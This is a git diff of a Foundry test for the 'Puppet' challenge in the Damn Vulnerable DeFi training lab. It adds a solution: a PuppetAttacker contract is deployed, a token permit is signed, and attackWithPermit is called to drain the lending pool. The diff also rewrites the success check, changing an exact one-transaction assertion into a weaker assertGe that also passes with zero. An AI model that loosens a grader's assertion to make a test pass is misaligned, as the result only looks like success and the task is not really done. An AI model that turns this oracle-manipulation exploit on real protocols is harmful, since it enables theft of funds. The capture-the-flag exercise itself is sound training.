@@ -4,7 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
+import {PuppetPool, PuppetAttacker} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
@@ -24,6 +24,7 @@ contract PuppetChallenge is Test {
     PuppetPool lendingPool;
     IUniswapV1Exchange uniswapV1Exchange;
     IUniswapV1Factory uniswapV1Factory;
+    PuppetAttacker attacker;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -43,8 +44,9 @@ contract PuppetChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy a exchange that will be used as the factory template
-        IUniswapV1Exchange uniswapV1ExchangeTemplate =
-            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
+        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
+            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json"))
+        );
 
         // Deploy factory, initializing it with the address of the template exchange
         uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
@@ -58,6 +60,9 @@ contract PuppetChallenge is Test {
 
         // Deploy the lending pool
         lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));
+
+        // Deploy the attacker contract
+        attacker = new PuppetAttacker(lendingPool, uniswapV1Exchange, recovery);
 
         // Add initial token and ETH liquidity to the pool
         token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
@@ -92,15 +97,39 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        bytes32 domainSeparator = token.DOMAIN_SEPARATOR();
+        bytes32 permitHash = keccak256(
+            abi.encode(
+                keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+                player,
+                address(attacker),
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                token.nonces(player),
+                block.timestamp
+            )
+        );
+
+        // Sign the hash
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            playerPrivateKey,
+            keccak256(abi.encodePacked("\x19\x01", domainSeparator, permitHash))
+        );
+        attacker.attackWithPermit{value: PLAYER_INITIAL_ETH_BALANCE}(
+            player,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            block.timestamp,
+            v,
+            r,
+            s
+        );
     }
 
     // Utility function to calculate Uniswap prices
-    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
-        private
-        pure
-        returns (uint256)
-    {
+    function _calculateTokenToEthInputPrice(
+        uint256 tokensSold,
+        uint256 tokensInReserve,
+        uint256 etherInReserve
+    ) private pure returns (uint256) {
         return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
     }
 
@@ -109,7 +138,7 @@ contract PuppetChallenge is Test {
      */
     function _isSolved() private view {
         // Player executed a single transaction
-        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
+        assertGe(1, vm.getNonce(player), "Player executed more than one tx");
 
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
